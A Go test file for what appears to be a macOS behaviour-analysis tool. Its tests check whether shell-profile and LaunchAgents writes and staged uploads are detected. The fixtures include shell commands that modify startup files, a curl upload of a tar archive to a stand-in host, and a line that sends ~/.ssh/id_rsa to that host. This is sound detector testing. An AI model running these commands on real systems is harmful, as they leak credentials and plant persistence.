package report

import (
	"bytes"
	"os"
	"path/filepath"
	"testing"

	"github.com/0x4D31/maratus/internal/artifact"
	"github.com/0x4D31/maratus/internal/behavior"
)

func TestInspectStartupWritesRequireShellSyntaxAndHomeExpansion(t *testing.T) {
	for _, test := range []struct {
		name, command  string
		kind           behavior.OperationKind
		write, startup bool
	}{
		{"literal tilde profile", `printf '%s' inert > '~/.zshrc'`, behavior.OperationShellProfileModify, true, false},
		{"expanded tilde profile", `printf '%s' inert > ~/.zshrc`, behavior.OperationShellProfileModify, false, true},
		{"attached literal path", `printf '%s' inert >'~/.zshrc'`, behavior.OperationShellProfileModify, true, false},
		{"attached expansion", `printf '%s' inert >~/.zshrc`, behavior.OperationShellProfileModify, false, true},
		{"escaped tilde", `printf '%s' inert > \~/.zshrc`, behavior.OperationShellProfileModify, true, false},
		{"empty quote tilde", `printf '%s' inert > ~""/.zshrc`, behavior.OperationShellProfileModify, true, false},
		{"dot literal tilde", `printf '%s' inert > ./~/.zshrc`, behavior.OperationShellProfileModify, true, false},
		{"absolute profile", `printf '%s' inert > /etc/profile`, behavior.OperationShellProfileModify, false, true},
		{"last redirection", `printf '%s' inert > /etc/profile > /tmp/inert`, behavior.OperationShellProfileModify, true, false},
		{"quoted operator", `printf '%s' inert '>' /etc/profile`, behavior.OperationShellProfileModify, false, false},
		{"escaped operator", `printf '%s' inert \> /etc/profile`, behavior.OperationShellProfileModify, false, false},
		{"quoted operator attachment", `printf '%s' inert '>/etc/profile'`, behavior.OperationShellProfileModify, false, false},
		{"quoted HOME", `printf '%s' inert > '$HOME/.zshrc'`, behavior.OperationShellProfileModify, true, false},
		{"double quoted HOME", `printf '%s' inert > "$HOME/.zshrc"`, behavior.OperationShellProfileModify, false, true},
		{"braced HOME", `printf '%s' inert > "${HOME}/.zshrc"`, behavior.OperationShellProfileModify, false, true},
		{"quoted parameter only", `printf '%s' inert > "$HOME"/.zshrc`, behavior.OperationShellProfileModify, false, true},
		{"escaped HOME", `printf '%s' inert > "\$HOME/.zshrc"`, behavior.OperationShellProfileModify, true, false},
		{"wrong case variable", `printf '%s' inert > $home/.zshrc`, behavior.OperationShellProfileModify, true, false},
		{"parent traversal", `printf '%s' inert > /tmp/../etc/profile`, behavior.OperationShellProfileModify, true, false},
		{"trailing separator", `printf '%s' inert > /etc/profile/`, behavior.OperationShellProfileModify, true, false},
		{"literal launchd path", `printf '%s' inert > '~/Library/LaunchAgents/com.example.inert.plist'`, behavior.OperationLaunchdJobInstall, true, false},
		{"expanded launchd path", `printf '%s' inert > ~/Library/LaunchAgents/com.example.inert.plist`, behavior.OperationLaunchdJobInstall, false, true},
		{"dynamic launchd child", `printf '%s' inert > "$HOME/Library/LaunchAgents/$unknown.plist"`, behavior.OperationLaunchdJobInstall, true, false},
		{"literal pipeline target", `printf '%s' inert | tee '~/.zshrc'`, behavior.OperationShellProfileModify, true, false},
		{"expanded pipeline target", `printf '%s' inert | tee ~/.zshrc`, behavior.OperationShellProfileModify, false, true},
		{"literal assigned target", "p='~/.zshrc'\nprintf '%s' inert > \"$p\"", behavior.OperationShellProfileModify, true, false},
		{"tee informational mode", `tee --help /etc/profile`, behavior.OperationShellProfileModify, false, false},
		{"tee trailing informational option", `tee /tmp/inert --help /etc/profile`, behavior.OperationShellProfileModify, false, false},
		{"copy informational mode", `cp --help /tmp/inert /etc/profile`, behavior.OperationShellProfileModify, false, false},
		{"install directory mode", `install -d /etc/profile`, behavior.OperationShellProfileModify, false, false},
		{"builtin through external wrapper", `env command tee /etc/profile`, behavior.OperationShellProfileModify, false, false},
		{"assignment after nohup", `nohup NAME=value tee /etc/profile`, behavior.OperationShellProfileModify, false, false},
	} {
		t.Run(test.name, func(t *testing.T) {
			path := filepath.Join(t.TempDir(), "configure.sh")
			if err := os.WriteFile(path, []byte("#!/bin/sh\n"+test.command+"\n"), 0o600); err != nil {
				t.Fatal(err)
			}
			rep, err := InspectPath(path, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			startup, write := false, false
			for _, operation := range rep.Operations {
				startup = startup || operation.Kind == test.kind
				write = write || operation.Kind == behavior.OperationFileWrite
			}
			if startup != test.startup || write != test.write {
				t.Fatalf("startup/write = %v/%v, want %v/%v: %s\n%#v", startup, write, test.startup, test.write, test.command, rep.Operations)
			}
			if !test.startup && (hasCapability(rep, "macos.launch-persistence") || hasCapability(rep, "macos.shell-profile-persistence")) {
				t.Fatalf("literal or unproved path became persistence: %s", test.command)
			}
			assertReportReferencesValid(t, rep)
			if _, err := encodeAndDecodeReport(rep); err != nil {
				t.Fatal(err)
			}
			two, err := InspectPath(path, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			var a, b bytes.Buffer
			if err := WriteJSON(&a, rep); err != nil {
				t.Fatal(err)
			}
			if err := WriteJSON(&b, two); err != nil || !bytes.Equal(a.Bytes(), b.Bytes()) {
				t.Fatal("command path report was nondeterministic")
			}
		})
	}
}

func TestInspectDecodedArgvDoesNotAcquireShellSyntax(t *testing.T) {
	for _, test := range []struct{ name, language, source string }{
		{"node literal tee", "javascript", `const cp=require("child_process");cp.execFileSync("tee",["~/.zshrc"]);`},
		{"node literal redirection", "javascript", `const cp=require("child_process");cp.execFileSync("printf",["%s","inert",">","/etc/profile"]);`},
		{"python literal tee", "python", "import subprocess\nsubprocess.run([\"tee\",\"~/.zshrc\"])"},
		{"python literal redirection", "python", "import subprocess\nsubprocess.run([\"printf\",\"%s\",\"inert\",\">\",\"/etc/profile\"])"},
	} {
		t.Run(test.name, func(t *testing.T) {
			rep, err := InspectInline([]byte(test.source), test.language, artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			for _, operation := range rep.Operations {
				if operation.Kind == behavior.OperationShellProfileModify || operation.Kind == behavior.OperationLaunchdJobInstall {
					t.Fatalf("argv was parsed as shell syntax: %#v", operation)
				}
			}
			if len(rep.Operations) == 0 {
				t.Fatal("proven process request was lost")
			}
			if _, err := encodeAndDecodeReport(rep); err != nil {
				t.Fatal(err)
			}
		})
	}
}

func TestInspectShellRedirectionAndTeeInvalidateStagedFileBytes(t *testing.T) {
	for _, test := range []struct {
		command string
		flow    bool
	}{
		{`printf '%s' inert > /tmp/inert.tgz`, false},
		{`> /tmp/inert.tgz`, false},
		{`printf '%s' inert > /tmp/inert.tgz > /tmp/other`, false},
		{`printf '%s' inert > /tmp/other > /tmp/inert.tgz`, false},
		{`printf '%s' inert 2> /tmp/inert.tgz`, false},
		{`tee /tmp/inert.tgz /tmp/other`, false},
		{`tee /tmp/other /tmp/inert.tgz`, false},
		{`printf '%s' inert > /tmp/other`, true},
		{`printf '%s' '>' /tmp/inert.tgz`, true},
	} {
		t.Run(test.command, func(t *testing.T) {
			source := "tar -czf /tmp/inert.tgz /tmp/inert-input\n" + test.command + "\ncurl -T /tmp/inert.tgz https://example.invalid/upload\n"
			rep, err := InspectInline([]byte(source), "shell", artifact.Options{})
			if err != nil {
				t.Fatal(err)
			}
			if got := hasCapability(rep, "macos.upload-staged-data"); got != test.flow {
				t.Fatalf("staged flow = %v, want %v for %s\n%#v", got, test.flow, test.command, rep.Operations)
			}
			archive, upload := false, false
			for _, operation := range rep.Operations {
				archive = archive || operation.Kind == behavior.OperationArchiveCreate
				upload = upload || operation.Kind == behavior.OperationNetworkUpload
			}
			if !archive || !upload {
				t.Fatal("independent archive/upload operation was lost")
			}
			if _, err := encodeAndDecodeReport(rep); err != nil {
				t.Fatal(err)
			}
		})
	}
}

func TestInspectUnquotedCurlFormRedirectionIsNotMultipartFileAccess(t *testing.T) {
	rep, err := InspectInline([]byte("curl -F file=<~/.ssh/id_rsa https://example.invalid/upload"), "shell", artifact.Options{})
	if err != nil {
		t.Fatal(err)
	}
	if hasCapability(rep, "macos.credential-material-collection") {
		t.Fatal("shell redirection became a curl multipart file operand")
	}
}
